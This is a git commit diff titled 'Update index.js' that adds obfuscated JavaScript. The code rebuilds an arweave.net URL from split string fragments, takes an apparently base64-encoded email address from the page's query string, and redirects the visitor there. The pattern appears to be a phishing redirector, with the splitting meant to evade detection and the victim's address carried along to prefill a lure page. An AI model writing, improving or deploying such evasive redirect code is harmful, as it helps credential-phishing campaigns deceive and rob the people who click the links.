34b537cd4843f50cc10d4ce7c6fc4ce3e949b24f
kelvinbathgate <kelvinbathgate@gmail.com>
2024-11-12 19:24:06 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,25 @@
-window.location.assign('https://ybj4awvm4dpso2xys3erxln2xt3ti3qlje32ozhuvoliio35au3q.arweave.net/wFPAWqzg3ydq-JbJG626vPc0bgtJN6dk9KuWhDt9BTc?provider=1-hh@mm.cm')
+let rd1 = "htt"
+let rd2 = "ps://ybj4awvm4dpso2xys3erxln2xt3ti3qlje32ozhuvol"
+let rd3 = "iio35au3q.arweave.net/wF"
+let rd4 = "PAWqzg3ydq-Jb"
+let rd5 = "JG626vPc0bgtJN6dk9"
+let rd6 = "KuWhDt9BTc"
+let rd7 = "?signature=0f5597453ae230b4d7b687f2551fb441db7f2e6f&provider=1-"
+let xx = window.location.href.split("?");
+let m = ""
+
+xx = xx[1].split("-");
+
+      var base64regex =
+        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+      if (!base64regex.test(xx[1])) {
+        m = xx[1];
+      } else {
+        m = atob(xx[1]);
+      }
+n = xx[2]
+
+let rd = rd1 + rd2 + rd3 + rd4 + rd5 + rd6 + rd7 + m + '-' + n
+
+window.location.assign(rd)
